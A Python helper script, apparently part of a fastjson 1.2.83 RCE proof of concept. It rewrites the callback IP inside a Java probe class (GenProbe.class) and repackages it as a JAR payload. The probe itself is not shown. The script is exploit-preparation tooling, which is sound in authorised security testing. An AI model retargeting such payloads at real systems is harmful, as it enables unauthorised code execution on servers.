#!/usr/bin/env python3
"""
修补 probe → 输出正确的 probe 文件

1. 提取 class 文件
2. 修改常量池中的回调 IP (127.0.0.1 → 192.168.1.1)
3. 重新打包为 JAR，entry 为 GenProbe.class（根目录，带 .class 后缀）
"""

import struct
import zipfile
import shutil
import os

def patch_class_bytecode(data: bytes, old_ip: str, new_ip: str) -> bytes:
    """
    修改 class 文件常量池中的 IP 字符串。
    由于新旧 IP 长度不同，需要重建常量池。
    """
    if len(old_ip) >= len(new_ip):
        raise ValueError("new_ip must be longer than old_ip for this simple patcher")
    
    old_bytes = old_ip.encode("utf-8")
    new_bytes = new_ip.encode("utf-8")
    diff = len(new_bytes) - len(old_bytes)
    
    # 解析 class 文件头
    # magic (4) + version (4) + constant_pool_count (2)
    pos = 8
    cp_count = struct.unpack(">H", data[pos:pos+2])[0]
    pos += 2
    
    # 遍历常量池，记录每个 entry 的起始位置和类型
    entries = []
    i = 1
    while i < cp_count:
        tag = data[pos]
        entries.append((pos, tag))
        if tag == 1:  # CONSTANT_Utf8
            length = struct.unpack(">H", data[pos+1:pos+3])[0]
            pos += 3 + length
        elif tag in (3, 4):  # CONSTANT_Integer, CONSTANT_Float
            pos += 5
        elif tag in (5, 6):  # CONSTANT_Long, CONSTANT_Double (take 2 indices)
            pos += 9
            i += 1  # these take two entries
        elif tag in (9, 10, 11):  # CONSTANT_Fieldref, Methodref, InterfaceMethodref
            pos += 5
        elif tag == 12:  # CONSTANT_NameAndType
            pos += 5
        elif tag in (15, 16, 17, 18, 19, 20):  # MethodHandle, MethodType, Dynamic, InvokeDynamic, Module, Package
            if tag == 15:  # MethodHandle
                pos += 4
            elif tag == 16:  # MethodType
                pos += 3
            elif tag in (17, 18):  # Dynamic, InvokeDynamic
                pos += 5
            elif tag in (19, 20):  # Module, Package
                pos += 3
        elif tag == 7:  # CONSTANT_Class
            pos += 3
        elif tag == 8:  # CONSTANT_String
            pos += 3
        else:
            raise ValueError(f"Unknown constant pool tag {tag} at position {pos}")
        i += 1
    
    # 找到 old_ip 所在的 Utf8 entry
    target_entry_pos = None
    target_entry_len = None
    for entry_pos, tag in entries:
        if tag == 1:
            length = struct.unpack(">H", data[entry_pos+1:entry_pos+3])[0]
            start = entry_pos + 3
            end = start + length
            if data[start:end] == old_bytes:
                target_entry_pos = entry_pos
                target_entry_len = length
                break
    
    if target_entry_pos is None:
        raise ValueError(f"Could not find '{old_ip}' in constant pool")
    
    # 重建类文件
    # 1. 头部 (magic + version + cp_count)
    result = bytearray(data[:10])  # 8 + 2 for cp_count
    
    # 2. 重建常量池
    for entry_pos, tag in entries:
        if entry_pos == target_entry_pos:
            # 修改这个 entry: 更新长度和数据
            result.append(tag)  # tag (1 byte)
            result.extend(struct.pack(">H", len(new_bytes)))  # new length (2 bytes)
            result.extend(new_bytes)  # new data
        else:
            # 复制原始数据
            if tag == 1:
                length = struct.unpack(">H", data[entry_pos+1:entry_pos+3])[0]
                end = entry_pos + 3 + length
                result.extend(data[entry_pos:end])
            elif tag in (5, 6):
                end = entry_pos + 9
                result.extend(data[entry_pos:end])
            elif tag == 15:
                end = entry_pos + 4
                result.extend(data[entry_pos:end])
            elif tag in (16, 19, 20):
                end = entry_pos + 3
                result.extend(data[entry_pos:end])
            elif tag in (17, 18):
                end = entry_pos + 5
                result.extend(data[entry_pos:end])
            else:
                # 3, 4, 7, 8, 9, 10, 11, 12
                if tag in (3, 4):
                    end = entry_pos + 5
                elif tag in (7, 8):
                    end = entry_pos + 3
                elif tag in (9, 10, 11, 12):
                    end = entry_pos + 5
                else:
                    end = entry_pos + 1
                result.extend(data[entry_pos:end])
    
    # 3. 复制常量池之后的剩余数据（access_flags, this_class, super_class, interfaces, fields, methods, attributes）
    result.extend(data[pos:])
    
    return bytes(result)


def main():
    work_dir = "/Users/bytedance/fastjson-1.2.83-rce/poc"
    jar_path = os.path.join(work_dir, "probe")
    output_path = os.path.join(work_dir, "probe")
    
    if not os.path.exists(jar_path):
        print(f"[!] 找不到 {jar_path}")
        return 1
    
    # 1. 从 probe 中提取 class 文件
    print("[*] 提取 GenProbe.class...")
    with zipfile.ZipFile(jar_path, "r") as zf:
        names = zf.namelist()
        for entry in ("GenProbe.class", "com/alibaba/fastjson/poc/GenProbe.class", "GenProbe"):
            if entry in names:
                class_data = zf.read(entry)
                break
        else:
            raise ValueError(f"probe 中找不到 GenProbe class entry: {names}")
    
    # 2. 修补字节码，修改回调 IP
    print("[*] 修补回调 IP (127.0.0.1 → 192.168.1.1)...")
    patched = patch_class_bytecode(class_data, "127.0.0.1", "192.168.1.1")
    
    # 验证
    assert b"192.168.1.1" in patched, "修补失败：新 IP 未找到"
    assert b"127.0.0.1" not in patched, "修补失败：旧 IP 仍存在"
    print("[+] 修补成功")
    
    # 3. 创建临时目录，制作 JAR
    tmpdir = os.path.join(work_dir, ".tmp_probe")
    os.makedirs(tmpdir, exist_ok=True)
    entry_path = os.path.join(tmpdir, "GenProbe.class")
    with open(entry_path, "wb") as f:
        f.write(patched)
    
    # 4. 打包 JAR（entry = GenProbe.class，带 .class 后缀）
    print("[*] 打包 JAR...")
    os.system(f"cd {tmpdir} && jar cf {output_path} GenProbe.class 2>/dev/null")
    
    # 如果 jar 命令不可用，用 Python 的 zip 模块替代
    if not os.path.exists(output_path):
        print("[*] jar 命令不可用，使用 Python zipfile...")
        import zipfile as zf2
        with zf2.ZipFile(output_path, "w", zf2.ZIP_DEFLATED) as zf:
            # JAR 需要 META-INF/MANIFEST.MF
            manifest = b"Manifest-Version: 1.0\r\nCreated-By: patch_probe.py\r\n\r\n"
            zf.writestr("META-INF/MANIFEST.MF", manifest)
            zf.write(entry_path, "GenProbe.class")
    
    # 清理
    shutil.rmtree(tmpdir, ignore_errors=True)
    
    # 验证
    with zipfile.ZipFile(output_path, "r") as zf:
        names = zf.namelist()
        print(f"[+] JAR 内容: {names}")
        assert "GenProbe.class" in names, "JAR 缺少 entry 'GenProbe.class'"
    
    print(f"[+] 输出: {output_path}")
    print(f"[*] 文件大小: {os.path.getsize(output_path)} bytes")
    return 0


if __name__ == "__main__":
    exit(main())
